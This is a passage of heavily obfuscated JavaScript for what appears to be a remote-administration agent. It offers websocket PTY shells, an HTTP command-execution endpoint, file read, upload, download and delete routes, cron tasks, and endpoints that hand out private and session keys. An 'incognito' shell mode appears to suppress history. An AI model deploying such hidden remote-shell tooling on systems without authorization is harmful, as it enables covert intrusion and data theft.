        this[l1(0x51f)] = a, this['requestId'] = b, this[l1(0x5ab)] = d, this[l1(0x6e8)] = f;
        const h = i => a0P[l1(0xd42)]('[终端会话\x20' + b + ']\x20' + i);
        this[l1(0xc91)] = !c, g[l1(0x5fa)](h, this[l1(0xc91)] ? l1(0x38e) : g['GzwKx']), a['on'](l1(0xbe8), i => this[l1(0xc4b)](i));
        try {
            this[l1(0xc91)] && await this[l1(0x6ba)](h), await this[l1(0x904)](h);
        } catch (i) {
            h('❌\x20终端会话异常:\x20' + i[l1(0xbe8)]), await this[l1(0x3b6)]();
        }
    }
    async [a0cm(0x904)](a) {
        const l2 = a0cm, b = {
                'TkmKq': l2(0x497),
                'IPMwo': function (h, i) {
                    return h(i);
                },
                'FDWpT': l2(0x46a),
                'ccnDN': function (h, i) {
                    return h === i;
                },
                'JGMTA': l2(0xd85),
                'NuBUh': function (h) {
                    return h();
                },
                'eiVhX': l2(0x218),
                'XWqkP': function (h, i) {
                    return h(i);
                },
                'SZUuX': l2(0x9d3),
                'BcYFR': l2(0x338),
                'sfyim': function (h, i) {
                    return h !== i;
                },
                'EJMwc': l2(0x269),
                'dQPZE': '/dev/null',
                'XWckp': l2(0xc97),
                'qXugr': l2(0xa9e),
                'LKUBb': 'xterm-256color',
                'cmVxH': function (h, i) {
                    return h(i);
                },
                'hOkmu': l2(0x245),
                'AMfnL': function (h, i) {
                    return h > i;
                },
                'rpMjK': l2(0x7bc)
            };
        b[l2(0x1aa)](process['platform'], b[l2(0xa68)]) && b[l2(0x1aa)](typeof Bun, l2(0x3c7)) && !a0C && !a0D && await b[l2(0x2a6)](a0O);
        if (!a0C) {
            const h = a0D || b['eiVhX'];
            b[l2(0x204)](a, '❌\x20终端基础设施不可用:\x20' + h);
            try {
                this[l2(0x51f)]['close'](0x3f3, b[l2(0x92e)]);
            } catch (i) {
            }
            throw new Error(h);
        }
        const c = this[l2(0x5dd)]();
        b['IPMwo'](a, l2(0x40a) + c);
        const d = Object[l2(0x2db)]({}, process.env);
        delete d[l2(0xb91)], d[l2(0x7f7)] = 'xterm-256color';
        if (!d[l2(0x544)])
            d[l2(0x544)] = b[l2(0x9de)];
        this[l2(0x6e8)] && b[l2(0x494)](process[l2(0x267)], b[l2(0x66f)]) && (d[l2(0x2cb)] = b[l2(0x602)]);
        const f = this[l2(0x6e8)] && b['ccnDN'](process['platform'], l2(0x269)) && b[l2(0x1aa)](a0o[l2(0x814)](c)['toLowerCase'](), b['XWckp']) ? [
                l2(0x6b8),
                '-Command',
                b['qXugr']
            ] : [], g = a0Q();
        try {
            const j = {
                'name': b[l2(0xc6f)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (b[l2(0x1aa)](process['platform'], 'win32'))
                try {
                    this[l2(0x388)] = a0C[l2(0x942)](c, f, j);
                } catch (k) {
                    b['IPMwo'](a, l2(0x469) + k['message']), this[l2(0x388)] = new a0cf(c, d, g, f), this[l2(0x388)][l2(0x942)]();
                }
            else
                this[l2(0x388)] = a0C[l2(0x942)](c, f, j);
            b[l2(0xdb4)](a, '🚀\x20终端进程已启动\x20(PID:\x20' + (this[l2(0x388)]['pid'] || l2(0x833)) + ')');
            this['metaRequested'] && this[l2(0x916)](c);
            this[l2(0x989)] = b[l2(0x32f)];
            while (b[l2(0x10d)](this['msgQueue'][l2(0x55c)], 0x0)) {
                const l = this[l2(0x6d1)][l2(0x3b0)]();
                this[l2(0x1a2)](l);
            }
            this['ptyProcess']['onData'](m => {
                const l3 = l2;
                try {
                    let n = Buffer[l3(0x1e7)](m, b[l3(0x1a1)]);
                    this['useNoise'] && this[l3(0x32d)] && this[l3(0x32d)][l3(0x63d)] && (n = this['cipher'][l3(0x28a)](n)), this[l3(0x51f)]['readyState'] === 0x1 && this[l3(0x51f)][l3(0x77d)](n);
                } catch (o) {
                }
            }), this[l2(0x388)][l2(0x72f)](({
                exitCode: m,
                signal: n
            }) => {
                const l4 = l2;
                a('🔌\x20终端进程退出\x20(Code:\x20' + m + l4(0x66c) + n + ')'), this[l4(0x3b6)]();
            }), this[l2(0x51f)]['on'](b[l2(0xbde)], () => {
                const l5 = l2;
                b[l5(0x1f7)](a, b[l5(0x3ee)]), this[l5(0x3b6)]();
            });
        } catch (m) {
            b[l2(0x1f7)](a, l2(0x1fe) + m[l2(0xbe8)]), await this['cleanup']();
            throw m;
        }
    }
    static ['normalizeShellName'](a) {
        const l6 = a0cm, b = {
                'BMLGo': function (d, f) {
                    return d(f);
                },
                'ogHXm': function (d, f) {
                    return d || f;
                },
                'GcIil': l6(0x367),
                'quvzF': function (d, f) {
                    return d || f;
                }
            };
        let c = a0o[l6(0x814)](b['BMLGo'](String, b[l6(0xc42)](a, ''))['trim']())['toLowerCase']();
        if (c[l6(0xb13)](b['GcIil']))
            c = c[l6(0x2d5)](0x0, -0x4);
        return b[l6(0x144)](c, 'sh');
    }
    static ['incognitoNativeApplied'](a) {
        const l7 = a0cm, b = {
                'XwKsV': function (c, d) {
                    return c === d;
                },
                'ePtrh': function (c, d) {
                    return c === d;
                },
                'HUqID': l7(0xc97),
                'tFgtM': 'cmd.exe'
            };
        if (b[l7(0x399)](process[l7(0x267)], l7(0x269))) {
            const c = a0o[l7(0x814)](String(a || ''))['toLowerCase']();
            return b[l7(0xf8)](c, b[l7(0x251)]) || b[l7(0x399)](c, b[l7(0x606)]);
        }
        return !![];
    }
    [a0cm(0x916)](a) {
        const l8 = a0cm, b = {
                'KsuTp': l8(0x12f),
                'VmtMD': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer[l8(0x1e7)](JSON[l8(0xd94)]({
                'type': b[l8(0x339)],
                'shell': a0cg['normalizeShellName'](a),
                'path': a,
                'incognito': !!(this[l8(0x6e8)] && a0cg['incognitoNativeApplied'](a))
            }));
            this['useNoise'] && this['cipher'] && this[l8(0x32d)][l8(0x63d)] && (c = this['cipher'][l8(0x28a)](c)), this['websocket'] && b[l8(0xc36)](this[l8(0x51f)][l8(0x127)], 0x1) && this[l8(0x51f)][l8(0x77d)](c);
        } catch (d) {
        }
    }
    [a0cm(0x1a2)](a) {
        const l9 = a0cm, b = {
                'Fcxvf': l9(0x497),
                'tJSZu': 'heartbeat',
                'Mowiw': l9(0x17d),
                'aRnFY': function (c, d) {
                    return c === d;
                },
                'ynUge': function (c, d) {
                    return c !== d;
                },
                'UTzpy': l9(0x5bd)
            };
        if (!this['ptyProcess'])
            return;
        try {
            const c = Buffer['from'](a);
            let d;
            this[l9(0xc91)] ? d = this[l9(0x32d)][l9(0x18a)](c) : d = c;
            let f = ![], g = d['toString'](b[l9(0xc8a)]);
            if (g[l9(0x58a)]()[l9(0x830)]('{'))
                try {
                    const h = JSON[l9(0x881)](g);
                    f = !![];
                    if (h['type'] === b[l9(0x4d6)]) {
                        let i = Buffer['from'](JSON[l9(0xd94)]({ 'type': l9(0x1d2) }));
                        if (this['useNoise'])
                            i = this[l9(0x32d)]['encrypt'](i);
                        this[l9(0x51f)][l9(0x77d)](i);
                        return;
                    }
                    if (h[l9(0x483)] === b[l9(0x2e3)]) {
                        this[l9(0x388)][l9(0x17d)](h['cols'] || 0x50, h[l9(0x20f)] || 0x18);
                        return;
                    }
                    if (b[l9(0x3e8)](h[l9(0x483)], 'input') && b[l9(0xa8b)](h[l9(0x5f8)], undefined)) {
                        let j = h['encoding'] === b['UTzpy'] ? Buffer[l9(0x1e7)](h[l9(0x5f8)], b['UTzpy'])['toString'](b[l9(0xc8a)]) : h[l9(0x5f8)];
                        this[l9(0x388)][l9(0x10b)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[l9(0x388)][l9(0x10b)](d['toString']('utf-8'));
        } catch (l) {
            a0P[l9(0xd42)]('[终端会话\x20' + this['requestId'] + ']\x20⚠️\x20指令处理异常:\x20' + l[l9(0xbe8)]);
            if (this[l9(0xc91)])
                this['cleanup']();
        }
    }
}
async function a0ch() {
    const la = a0cm, a = {
            'OZPzC': '@noble/curves/nist.js',
            'QfMWM': la(0x3df)
        }, b = await import(a['OZPzC']);
    a0A = b[la(0x99e)];
    const c = await import(a[la(0x5fd)]);
    a0B = c[la(0xaca)];
}
async function a0ci(a = {}) {
    const lb = a0cm, b = {
            'lLTMy': lb(0xcc8),
            'MGnMy': lb(0x5a9),
            'CoFNm': lb(0x208),
            'fhLQl': 'Access-Control-Allow-Headers',
            'qAnlu': lb(0x437),
            'JPGsv': lb(0x2f3),
            'RFfxF': lb(0x47f),
            'SGfMW': function (c, d) {
                return c === d;
            },
            'yulRP': lb(0xabd),
            'SgyJC': lb(0x99a),
            'DRHXp': function (c) {
                return c();
            },
            'KHZlw': function (c, d) {
                return c === d;
            },
            'uKvGG': lb(0xaa0),
            'owwvU': function (c, d) {
                return c !== d;
            },
            'OMKuj': function (c, d, f) {
                return c(d, f);
            },
            'DSmcy': lb(0x12a),
            'pFKpy': function (c, d) {
                return c === d;
            },
            'jFynS': lb(0x3a2),
            'UtNxn': lb(0x6f7),
            'cJnaZ': lb(0x9f9),
            'infvS': function (c, d) {
                return c === d;
            },
            'CldsR': lb(0x8c4),
            'TCkgn': function (c, d) {
                return c / d;
            },
            'GKaBg': function (c, d) {
                return c > d;
            },
            'nUfVx': function (c, d) {
                return c - d;
            },
            'PDsVM': lb(0x66d),
            'TeUqp': lb(0x2d6),
            'FoAFr': function (c, d) {
                return c(d);
            },
            'QDhSx': lb(0x103),
            'WkNDZ': lb(0xc1d),
            'GWxds': lb(0x73c),
            'aOSqG': lb(0x192),
            'fODnw': function (c, d, f) {
                return c(d, f);
            },
            'DLyBr': function (c, d, f) {
                return c(d, f);
            },
            'xCEFF': function (c, d) {
                return c(d);
            },
            'sMvOx': 'Invalid\x20binary\x20stream\x20request\x20body',
            'jPQoW': lb(0xc0b),
            'jMjQm': lb(0x9bd),
            'iDHoU': lb(0xed),
            'fULIl': function (c, d) {
                return c === d;
            },
            'SRdnh': lb(0xc6b),
            'uHTWY': 'base64',
            'ABuEE': lb(0x6ed),
            'GeWDb': lb(0x9ac),
            'dfBpD': lb(0x8b7),
            'ryYgE': lb(0x3e2),
            'nWrRK': lb(0xafc),
            'qOCAY': function (c, d) {
                return c < d;
            },
            'TLaYQ': function (c, d) {
                return c === d;
            },
            'iJBMd': function (c, d) {
                return c(d);
            },
            'TSCKQ': lb(0x9f2),
            'LONsn': function (c, d) {
                return c(d);
            },
            'xTMJl': function (c, d) {
                return c === d;
            },
            'EzQAV': function (c, d) {
                return c ?? d;
            },
            'hExeI': lb(0x9cf),
            'MRfDQ': function (c, d) {
                return c === d;
            },
            'aTjKc': lb(0x6e7),
            'eVSsN': lb(0x474),
            'uYbOd': lb(0x497),
            'atROL': function (c, d) {
                return c === d;
            },
            'IkGQY': lb(0xd2a),
            'LzDMy': function (c, d) {
                return c === d;
            },
            'cwtEi': function (c, d) {
                return c === d;
            },
            'fOxPb': 'undefined',
            'HDEHR': lb(0x9d6),
            'KrxYK': 'Starting\x20main()\x20function...',
            'ebHxS': lb(0xa10),
            'FKZgD': lb(0x803),
            'QmKuj': lb(0x808),
            'hquNY': lb(0x22d),
            'URrQe': lb(0x1a9),
            'XGCHQ': lb(0x1e3),
            'dAElK': lb(0x669),
            'Rxpyg': lb(0x3b9),
            'dptZb': lb(0x5f2),
            'qjpJZ': function (c) {
                return c();
            },
            'VoxUp': lb(0xb5c),
            'KeUoz': lb(0x542),
            'PECTj': function (c, d, f) {
                return c(d, f);
            },
            'olTQA': lb(0xc55),
            'LEXrA': lb(0xacf),
            'xGcPK': '/api/status',
            'EjQUH': lb(0x9fa),
            'AOOwh': lb(0x147),
            'kLVik': lb(0xc59),
            'yzamH': lb(0x44c),
            'suPFt': '/api/file/list',
            'yYVtz': lb(0x505),
            'RoGRF': '/api/file/cat',
            'usELo': '/api/fileraw',
            'iVBDX': lb(0x21f),
            'jRngD': '/api/file',
            'btWzc': '/api/file/new',
            'manXf': lb(0x6f1),
            'PNHGP': lb(0xc29),
            'GvgST': lb(0x71b),
            'nMgCX': lb(0xc4a),
            'dOKJw': lb(0x7fd),
            'IpqQl': lb(0xab9),
            'jWZvP': lb(0xcd8),
            'ZYlkv': '/api/task/onetime/execute',
            'PFKlD': '/api/argo',
            'BXLpb': lb(0x7e5),
            'rvGde': lb(0x27b),
            'iiWUr': lb(0x879),
            'fYdNd': lb(0x47e),
            'gusZd': 'SIGINT\x20handler\x20registered',
            'YUXMQ': lb(0x68b)
        };
    try {
        await b[lb(0x1ca)](a0ch), a0P[lb(0x3a5)](b[lb(0x70d)]), a0a1[lb(0x661)](a), a0P[lb(0x3a5)](b[lb(0x44e)]), a0a1[lb(0x4da)](), a0P['debug'](b[lb(0x913)]), a0P[lb(0x3a5)](b[lb(0x6d4)]);
        const c = new a0a9(a0a1[lb(0x750)], a0a1[lb(0x5bf)]);
        a0P[lb(0x3a5)](b[lb(0xb93)]);
        !a0a1['DEBUG'] && !c[lb(0xae4)] && (a0P['error'](b[lb(0xc75)]), a0P[lb(0xaa0)](b[lb(0x408)]), process[lb(0x744)](0x1));
        a0P[lb(0x3a5)](b[lb(0xa5a)]);
        const d = new a0a8();
        d[lb(0x921)] = () => a0a1[lb(0xcad)](), a0P[lb(0x3a5)]('TempKeyManager\x20initialized'), a0P[lb(0x3a5)](b[lb(0x58e)]);
        const f = new a0ac();
        a0P[lb(0x3a5)](lb(0xc61)), a0P['debug'](b[lb(0x806)]);
        const g = b[lb(0x30f)](a0f);
        a0x(g), a0P[lb(0x3a5)](b[lb(0x835)]), g[lb(0x1b5)]((l, m, n) => {
            const lc = lb;
            m[lc(0x405)](b[lc(0x8ed)], '*'), m[lc(0x405)](b[lc(0x9d5)], b[lc(0x444)]), m[lc(0x405)](b[lc(0xa34)], b['qAnlu']), m[lc(0x405)](b['JPGsv'], b['RFfxF']);
            if (b[lc(0x1df)](l[lc(0x394)], b[lc(0x110)]))
                return a0a1[lc(0x79a)] && m['set'](lc(0x6ed), b['SgyJC']), m[lc(0xaa2)](0xc8)[lc(0x536)]();
            b[lc(0x1ca)](n);
        }), g[lb(0x1b5)](a0f[lb(0x34f)]({
            'type': l => l[lb(0xa3d)] !== lb(0xb7b),
            'limit': b[lb(0x820)]
        })), g['use'](a0f[lb(0xa4e)]({ 'extended': !![] })), g[lb(0x1b5)](b[lb(0xa2a)](a0ab, c, d)), a0P[lb(0x3a5)]('Middleware\x20applied,\x20setting\x20up\x20routes...'), g[lb(0x81a)](b[lb(0x6c0)], async (l, m) => {
            const ld = lb;
            try {
                const n = await a0a1[ld(0xaa1)](), o = await a0a1[ld(0x715)](n[ld(0x92f)] || ''), p = await a0a1[ld(0x807)](), q = a0ac['assembleBaseInfo'](n, o, p);
                b[ld(0xad5)](l[ld(0xaa6)], !![]) ? (q[ld(0x8a3)] = a0a1[ld(0x238)], q['noise_key'] = a0a1['NOISE_KEY']) : (q['session_key'] = null, q['noise_key'] = null), m['json'](q), a0a1[ld(0xd88)] === '1' && a0ca[ld(0x760)]();
            } catch (r) {
                m[ld(0xaa2)](0x1f4)[ld(0x2a5)]({
                    'status': b[ld(0xb43)],
                    'message': r[ld(0xbe8)]
                });
            }
        }), g[lb(0x81a)](b[lb(0x398)], (l, m) => {
            const le = lb;
            let n = a0a1['TEMPKEY_DEFAULT_TTL_HOURS'];
            if (b['owwvU'](l[le(0x693)][le(0xd13)], undefined)) {
                const s = b[le(0x90a)](parseInt, l[le(0x693)][le(0xd13)], 0xa);
                if (Number[le(0x30a)](s) || s < 0x1 || s > a0a1[le(0x8a7)])
                    return m[le(0xaa2)](0x1a6)[le(0x2a5)]({ 'error': 'ttl\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x20' + a0a1['TEMPKEY_MAX_TTL_HOURS'] });
                n = s;
            }
            const o = typeof l['query'][le(0x1ab)] === b[le(0x387)] ? l[le(0x693)][le(0x1ab)][le(0x58a)]()[le(0x426)]() : '';
            let p;
            if (b[le(0x1ae)](o, '') || o === 'full')
                p = b['jFynS'];
            else {
                if (o === b[le(0x1e0)])
                    p = 'short';
                else
                    return m['status'](0x1a6)[le(0x2a5)]({ 'error': b[le(0x3f3)] });
            }
            const q = d[le(0x471)](n), r = u => new Date(u * 0x3e8)[le(0x213)]()[le(0x3a0)](le(0xcae), 'Z');
            m[le(0x2a5)]({
                'status': 'ok',
                'key_id': q['key_id'],
                'ttl_seconds': q[le(0x951)],
                'created_at': r(q['created_at']),
                'expires_at': r(q[le(0x6ef)]),
                'ecdsa': p === b['UtNxn'] ? {
                    'private_key': q[le(0xd26)],
                    'public_key': q[le(0xbba)]
                } : {
                    'private_key': q['ecdsa_private_key']['trim'](),
                    'public_key': q[le(0x686)][le(0x58a)]()
                },
                'ecies': b[le(0xca6)](p, le(0x6f7)) ? {
                    'private_key': q['ecies_private_key'],
                    'public_key': q[le(0xc5a)]
                } : {
                    'private_key': q[le(0xbb0)],
                    'public_key': q['ecies_public_key']
                }
            });
        }), g[lb(0x81a)](b[lb(0x281)], async (l, m) => {
            const lf = lb;
            try {
                const n = Math[lf(0x19a)](Date[lf(0x866)]() / 0x3e8);
                !a0a1[lf(0x81f)] || b[lf(0x62a)](b[lf(0x5af)](n, a0a1[lf(0xc08)]), a0a1[lf(0x1ba)]) ? (!a0a1[lf(0x742)] && (a0a1['_status_fetch_promise'] = f[lf(0xaf9)]()['then'](p => {
                    const lg = lf, q = lg(0xbe7)[lg(0xb0c)]('|');
                    let r = 0x0;
                    while (!![]) {
                        switch (q[r++]) {
                        case '0':
                            a0P['debug'](b['CldsR']);
                            continue;
                        case '1':
                            a0a1[lg(0xc08)] = Math[lg(0x19a)](b[lg(0x63a)](Date['now'](), 0x3e8));
                            continue;
                        case '2':
                            a0a1[lg(0x742)] = null;
                            continue;
                        case '3':
                            a0a1['_status_cache'] = p;
                            continue;
                        case '4':
                            return p;
                        }
                        break;
                    }
                })['catch'](p => {
                    const lh = lf;
                    a0a1[lh(0x742)] = null;
                    throw p;
                })), await a0a1['_status_fetch_promise']) : a0P[lf(0x3a5)](lf(0xa61));
                const o = { ...a0a1[lf(0x81f)] };
                m[lf(0x2a5)](o);
            } catch (p) {
                m[lf(0xaa2)](0x1f4)[lf(0x2a5)]({
                    'status': b['uKvGG'],
                    'message': p[lf(0xbe8)]
                });
            }
        });
        const h = async (l, m) => {
            const li = lb;
            try {
                let n = null;
                if (b[li(0x1df)](typeof l[li(0x341)], b[li(0x387)]))
                    n = l['body'][li(0x58a)]();
                else
                    l[li(0x341)] && typeof l['body'] === b[li(0x9e3)] && (n = l['body'][li(0x3b4)] || '');
                if (!n)
                    return m[li(0xaa2)](0x190)[li(0x2a5)]({
                        'status': b[li(0xb43)],
                        'message': b['TeUqp']
                    });
                const o = await a0ad[li(0x4b6)](n, {
                    'cwd': l[li(0x341)]['cwd'],
                    'env': l[li(0x341)]['env'],
                    'timeout': a0a1[li(0x6de)]
                });
                m['json'](o);
            } catch (p) {
                m['status'](0x1f4)[li(0x2a5)]({
                    'status': b[li(0xb43)],
                    'message': p[li(0xbe8)]
                });
            }
        };
        g['post'](b[lb(0x446)], h);
        for (const l of [
                b[lb(0xcc0)],
                b[lb(0x2c0)],
                b[lb(0x148)]
            ]) {
            g['post'](l, h);
        }
        g[lb(0x8a2)](b[lb(0xc66)], async (m, n) => {
            const lj = lb;
            try {
                const o = await a0ag['listFiles'](m[lj(0x341)][lj(0xa3d)], m[lj(0x341)]['recursive']);
                n[lj(0x2a5)]({
                    'status': 'ok',
                    'count': o['length'],
                    'files': o
                });
            } catch (p) {
                n[lj(0xaa2)](0x1f4)[lj(0x2a5)]({
                    'status': b[lj(0xb43)],
                    'message': p[lj(0xbe8)]
                });
            }
        }), g['post'](b[lb(0x4f6)], async (m, n) => {
            const lk = lb;
            try {
                const o = await a0ag[lk(0x23f)](m[lk(0x341)]['paths'] || []);
                n[lk(0x2a5)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[lk(0xaa2)](0x1f4)[lk(0x2a5)]({
                    'status': b[lk(0xb43)],
                    'message': p['message']
                });
            }
        }), g[lb(0x2f6)](lb(0x505), async (m, n) => {
            const ll = lb;
            try {
                const o = m[ll(0x341)][ll(0x682)] || {}, p = b[ll(0xad5)](m[ll(0x341)][ll(0x9a6)], !![]), q = await a0ag[ll(0x51b)](o, p);
                n[ll(0x2a5)](q);
            } catch (r) {
                n[ll(0xaa2)](0x1f4)['json']({
                    'status': b[ll(0xb43)],
                    'message': r[ll(0xbe8)]
                });
            }
        }), g[lb(0x8a2)](b[lb(0x88d)], async (m, n) => {
            const lm = lb;
            try {
                const o = await a0ag['readFile'](m[lm(0x341)][lm(0xa3d)]);
                n[lm(0x2a5)](o);
            } catch (p) {
                n['status'](0x1f4)[lm(0x2a5)]({
                    'status': b['uKvGG'],
                    'message': p[lm(0xbe8)]
                });
            }
        }), g[lb(0x8a2)](lb(0x6a8), async (m, n) => {
            const ln = lb;
            try {
                const o = await a0ag[ln(0x5a5)](m[ln(0x341)]['path'], m[ln(0x341)][ln(0x91c)], m[ln(0x341)][ln(0xc7c)], m[ln(0x341)][ln(0xc92)], m[ln(0x341)][ln(0x894)]);
                n['json'](o);
            } catch (p) {
                n[ln(0xaa2)](0x1f4)['json']({
                    'status': b['uKvGG'],
                    'message': p[ln(0xbe8)]
                });
            }
        }), g[lb(0x8a2)](b[lb(0xaf3)], a0f[lb(0xcc3)]({
            'type': b[lb(0xcf3)],
            'limit': b[lb(0x820)]
        }), async (m, n) => {
            const lo = lb;
            try {
                const o = b['FoAFr'](decodeURIComponent, m[lo(0x258)][b[lo(0xaab)]] || ''), p = b[lo(0x625)](decodeURIComponent, m['headers'][b[lo(0x216)]] || ''), q = m['headers'][b[lo(0x748)]], r = m[lo(0x258)][b['aOSqG']];
                if (!o || !p)
                    return n[lo(0xaa2)](0x190)['json']({
                        'status': b['uKvGG'],
                        'completed': ![],
                        'message': lo(0xdb6)
                    });
                const s = b['owwvU'](q, undefined) ? b['fODnw'](parseInt, b[lo(0x625)](String, q), 0xa) : null, t = b[lo(0xb8e)](r, undefined) ? b['DLyBr'](parseInt, b['xCEFF'](String, r), 0xa) : null, u = m['body'];
                if (!Buffer['isBuffer'](u))
                    return n['status'](0x190)[lo(0x2a5)]({
                        'status': b[lo(0xb43)],
                        'completed': ![],
                        'message': b[lo(0x2dc)]
                    });
                const v = await a0ag['uploadFileRaw'](o, p, u, s, t);
                n[lo(0x2a5)](v);
            } catch (w) {
                n[lo(0xaa2)](0x1f4)[lo(0x2a5)]({
                    'status': b[lo(0xb43)],
                    'completed': ![],
                    'message': w[lo(0xbe8)]
                });
            }
        }), g[lb(0x8a2)](b[lb(0xbdf)], async (m, n) => {
            const lp = lb;
            try {
                const o = await a0ag['downloadFile'](m[lp(0x341)][lp(0xa3d)]);
                n[lp(0x689)](lp(0x667), o[lp(0x883)][lp(0x7a0)]()), n['set'](b[lp(0xbcf)], o['path']), n[lp(0x689)](b['jMjQm'], b['iDHoU']);
                if (!a0a1[lp(0x79a)] && b[lp(0xadc)](m[lp(0x405)](b[lp(0x68c)]), '1') && a0a1['DOWNLOAD_ENCRYPT_MAX'] > 0x0 && o[lp(0x883)] <= a0a1[lp(0x29d)])
                    try {
                        const p = c['encryptData'](o[lp(0xc7c)], Buffer[lp(0x1e7)](a0a1[lp(0x238)], b['uHTWY']));
                        return n['set'](b[lp(0x37e)], b['GeWDb']), n[lp(0x77d)](p);
                    } catch (q) {
                        return n[lp(0xaa2)](0x1f4)[lp(0x2a5)]({
                            'status': b[lp(0xb43)],
                            'message': b[lp(0xa7c)]
                        });
                    }
                return n[lp(0x77d)](o[lp(0xc7c)]);
            } catch (r) {
                n[lp(0xaa2)](0x1f4)[lp(0x2a5)]({
                    'status': b[lp(0xb43)],
                    'message': r[lp(0xbe8)]
                });
            }
        }), g[lb(0xcfe)](b[lb(0x117)], async (m, n) => {
            const lq = lb;
            try {
                let o = m['body'][lq(0x340)];
                if (!o || !Array['isArray'](o)) {
                    o = [];
                    if (m['body'][lq(0xa3d)])
                        o[lq(0x1d5)](m['body'][lq(0xa3d)]);
                    if (m[lq(0x341)][lq(0x1a5)])
                        o[lq(0x1d5)](m[lq(0x341)][lq(0x1a5)]);
                }
                const p = await a0ag['deleteFiles'](o);
                n[lq(0x2a5)]({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n['status'](0x1f4)[lq(0x2a5)]({
                    'status': b[lq(0xb43)],
                    'message': q[lq(0xbe8)]
                });
            }
        }), g[lb(0x2f6)](lb(0x6a8), async (m, n) => {
            const lr = lb;
            try {
                const o = await a0ag[lr(0x104)](m[lr(0x341)][lr(0x1a8)] || m['body']);
                n[lr(0x2a5)]({
                    'status': 'ok',
                    'total': o['length'],
                    'success': o[lr(0x88f)](p => p[lr(0xaa2)] === 'ok')['length'],
                    'results': o
                });
            } catch (p) {
                n[lr(0xaa2)](0x1f4)[lr(0x2a5)]({
                    'status': b[lr(0xb43)],
                    'message': p[lr(0xbe8)]
                });
            }
        }), g[lb(0x8a2)](lb(0x56e), async (m, n) => {
            const ls = lb;
            try {
                const o = await a0ag[ls(0x82c)](m['body']);
                n['json']({
                    'status': 'ok',
                    'total': o[ls(0x55c)],
                    'success': o[ls(0x88f)](p => p[ls(0xaa2)] === 'ok')[ls(0x55c)],
                    'results': o
                });
            } catch (p) {
                n[ls(0xaa2)](0x1f4)['json']({
                    'status': ls(0xaa0),
                    'message': p['message']
                });
            }
        }), g[lb(0x8a2)](b[lb(0x64b)], async (m, n) => {
            const lt = lb;
            try {
                const o = await a0ag[lt(0x83a)](m['body'][lt(0xa3d)]);
                n[lt(0x2a5)](o);
            } catch (p) {
                n[lt(0xaa2)](0x1f4)['json']({
                    'status': b[lt(0xb43)],
                    'message': p[lt(0xbe8)]
                });
            }
        }), g[lb(0x8a2)](b[lb(0xc6a)], async (m, n) => {
            const lu = lb;
            try {
                const o = m[lu(0x341)] || {};
                if (!o[lu(0xa3d)])
                    return n[lu(0xaa2)](0x190)[lu(0x2a5)]({ 'error': b[lu(0xa63)] });
                if (!Array['isArray'](o[lu(0x554)]) || o[lu(0x554)][lu(0x55c)] === 0x0)
                    return n['status'](0x190)[lu(0x2a5)]({ 'error': b[lu(0x4e5)] });
                const p = await a0ag['zipItems'](o['path'], o[lu(0x554)], !!o['flat']);
                n[lu(0x2a5)](p);
            } catch (q) {
                const r = /Access denied/[lu(0xdb7)](q[lu(0xbe8)]) ? 0x193 : 0x190;
                n[lu(0xaa2)](r)[lu(0x2a5)]({
                    'status': b[lu(0xb43)],
                    'message': q['message']
                });
            }
        }), g[lb(0x8a2)](b[lb(0xccc)], async (m, n) => {
            const lv = lb;
            try {
                const o = m[lv(0x341)] || {};
                if (!o[lv(0xa3d)])
                    return n[lv(0xaa2)](0x190)[lv(0x2a5)]({ 'error': b[lv(0xa63)] });
                const p = await a0ag[lv(0x655)](o[lv(0xa3d)], o[lv(0x48e)], b[lv(0xb8e)](o[lv(0xca3)], ![]), Array[lv(0xcb3)](o[lv(0x1c8)]) ? o[lv(0x1c8)] : null);
                n['json'](p);
            } catch (q) {
                const r = /Access denied/[lv(0xdb7)](q[lv(0xbe8)]) ? 0x193 : 0x190;
                n[lv(0xaa2)](r)['json']({
                    'status': b['uKvGG'],
                    'message': q[lv(0xbe8)]
                });
            }
        }), g['get'](b[lb(0xd4f)], (m, n) => {
            const lw = lb;
            n[lw(0x2a5)](a0ai[lw(0xb03)]());
        }), g[lb(0x8a2)](lb(0x71b), async (m, n) => {
            const lx = lb;
            try {
                const o = await a0ai[lx(0xa01)](m['body']);
                n[lx(0x2a5)](o);
            } catch (p) {
                n['status'](0x1f4)[lx(0x2a5)]({
                    'status': lx(0xaa0),
                    'message': p[lx(0xbe8)]
                });
            }
        }), g['get'](lb(0x330), (m, n) => {
            const ly = lb;
            n[ly(0x2a5)](a0ai[ly(0xd00)]());
        }), g[lb(0x8a2)](lb(0x330), (m, n) => {
            const lz = lb;
            try {
                const o = a0ai['setCronTasks'](m[lz(0x341)]);
                n[lz(0x2a5)](o);
            } catch (p) {
                n[lz(0xaa2)](0x1f4)[lz(0x2a5)]({
                    'status': b[lz(0xb43)],
                    'message': p[lz(0xbe8)]
                });
            }
        }), g[lb(0x81a)](b[lb(0x2bd)], (m, n) => {
            const lA = lb;
            n[lA(0x2a5)](a0ai['getTaskStatus']());
        }), g[lb(0x81a)](lb(0xab9), (m, n) => {
            const lB = lb;
            let o = parseInt(m[lB(0x693)][lB(0x666)], 0xa) || 0x32;
            o = Math['min'](Math['max'](o, 0x1), 0x64), n[lB(0x2a5)](a0ai[lB(0xc4e)](o));
        }), g[lb(0x81a)](b[lb(0x6b6)], (m, n) => {
            const lC = lb;
            let o = b[lC(0x627)](parseInt, m['query'][lC(0x666)], 0xa) || 0x32;
            o = Math[lC(0x389)](Math['max'](o, 0x1), 0x64), n['json'](a0ai[lC(0x11e)](o));
        }), g[lb(0xcfe)](b[lb(0x958)], (m, n) => {
            const lD = lb;
            n[lD(0x2a5)](a0ai[lD(0xb04)]());
        }), g[lb(0xcfe)]('/api/task/log/cron', (m, n) => {
            const lE = lb;
            n[lE(0x2a5)](a0ai[lE(0x43c)]());
        }), g[lb(0x81a)](b[lb(0x695)], (m, n) => {
            const lF = lb;
            n[lF(0x2a5)](a0ai['getLogSummary']());
        }), g[lb(0x8a2)](b['ZYlkv'], async (m, n) => {
            const lG = lb;
            try {
                const o = await a0ai['executeOnetimeTasks']();
                n[lG(0x2a5)](o);
            } catch (p) {
                n[lG(0xaa2)](0x1f4)[lG(0x2a5)]({
                    'status': lG(0xaa0),
                    'message': p[lG(0xbe8)]
                });
            }
        });
        const i = {
